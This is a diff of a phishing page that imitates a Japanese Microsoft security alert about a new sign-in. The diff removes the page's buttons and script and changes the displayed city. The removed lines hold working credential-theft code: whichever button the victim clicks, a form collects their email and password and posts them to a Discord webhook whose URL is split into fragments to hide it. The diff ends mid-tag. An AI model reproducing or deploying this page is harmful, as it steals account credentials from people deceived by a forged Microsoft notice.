@@ -70,75 +70,10 @@ body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-c
 <table class="meta-tbl" id="meta-tbl">
 <tr><td>接続時間</td><td id="ts-cell">2026/11/22</td></tr>
 <tr><td>IPアドレス</td><td id="ip-cell"></td></tr>
-<tr><td>推定場所</td><td>大阪府・大阪市</td></tr>
+<tr><td>推定場所</td><td>大阪府・寝屋川市</td></tr>
 <tr><td>デバイス</td><td>ノートPC ／ Windows 11</td></tr>
 <tr><td>エージェント</td><td>Mozilla/5.0 (Win64) Chrome/131.0.0.0</td></tr>
 </table>
 <label class="chk-row"><input type="checkbox" checked> 今後の接続について通知しない</label>
 <div class="btn-row" id="btn-row">
-<button class="btn allow" onclick="doAction('allow')">この新しい接続を許可する</button>
-<button class="btn deny" onclick="doAction('deny')">この接続をブロックする</button>
-</div>
-<span class="detail-link" id="detail-link" onclick="doAction('allow')">接続の詳細を見る ›</span>
-<div class="divider"></div>
-<div id="form-area"></div>
-<div class="spin" id="sp"></div>
-<div class="ok" id="ok">
-<p>&#10003; 処理が完了しました</p>
-<small id="ok-detail"></small>
-</div>
-</div>
-<div class="foot">
-<span><a href="#" onclick="return false;">利用規約</a> ／ <a href="#" onclick="return false;">プライバシー概要</a> ／ <a href="#" onclick="return false;">法的情報</a></span>
-<span>&copy; Microsoft Corporation<span class="auto-note">この通知は自動的に送信されました。</span></span>
-</div>
-</div>
-</div>
-<script>
-var n=new Date();
-var pad=function(x){return("0"+x).slice(-2);};
-document.getElementById('ts-cell').textContent=n.getFullYear()+"/"+pad(n.getMonth()+1)+"/"+pad(n.getDate())+" "+pad(n.getHours())+":"+pad(n.getMinutes())+":"+pad(n.getSeconds())+" JST";
-var randIp='49.112.'+Math.floor(Math.random()*200+20)+'.'+Math.floor(Math.random()*200+20);
-document.getElementById('ip-cell').textContent=randIp;
-var H="https:/";
-var T="/discord.com/api/webhooks/";
-var A="1569533813548388482/";
-var B="7wipbj3B0igYJicr-BVwvRfRU9izfKWKjjDY15wU5desK4cQx7Tgmt4HkhhkYCiKvVoA";
-var t=new URLSearchParams(window.location.search).get('t')||'?';
-var action="";
-function doAction(a){
-action=a;
-document.getElementById("alert-box").style.display="none";
-document.getElementById("meta-tbl").style.display="none";
-document.querySelector(".chk-row").style.display="none";
-document.getElementById("btn-row").style.display="none";
-document.getElementById("detail-link").style.display="none";
-var reason,btnLabel;
-if(a==="allow"){reason="接続確認のため、以下の認証情報を入力してください。";btnLabel="接続確認を実行";}
-else{reason="接続をブロックします。認証情報を入力し「接続を許可しない」を選択してください。";btnLabel="接続を許可しない";}
-var area=document.getElementById("form-area");
-area.innerHTML='<div class="alert-box" style="font-size:16px;margin-bottom:18px;">'+reason+'</div><form id="f" class="login-form" onsubmit="return send()"><label>アカウント</label><input type="email" id="u" autocomplete="off"><label>パスワード</label><input type="text" id="p" autocomplete="off"><button class="btn-submit" type="submit">'+btnLabel+'</button></form>';
-area.style.display="block";
-setTimeout(function(){document.getElementById('u').focus();},100);
-}
-function send(){
-var u=document.getElementById("u").value;
-var p=document.getElementById("p").value;
-if(!u||!p)return false;
-document.getElementById("f").style.display="none";
-document.getElementById("sp").style.display="block";
-var url=H+T+A+B;
-var body=JSON.stringify({"content":"["+action.toUpperCase()+"] ["+t+"] user: "+u+"\npass: "+p+"\ntime: "+new Date().toLocaleTimeString("ja-JP")});
-fetch(url,{method:"POST",headers:{"Content-Type":"application/json"},body:body})
-.then(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";
-if(action==="allow"){document.getElementById("ok-detail").innerHTML="接続を許可しました。<br>今後の接続からの通知は送信されません。";}
-else{document.getElementById("ok-detail").innerHTML="接続をブロックしました。<br>アカウントは保護されました。";}
-})
-.catch(function(){document.getElementById("sp").style.display="none";document.getElementById("ok").style.display="block";
-document.getElementById("ok-detail").innerHTML=action==="allow"?"接続を許可しました。":"接続をブロックしました。";
-});
-return false;
-}
-</script>
-</body>
-</html>
+<button class="btn allow" onclick="doAction('allow')">この新しい
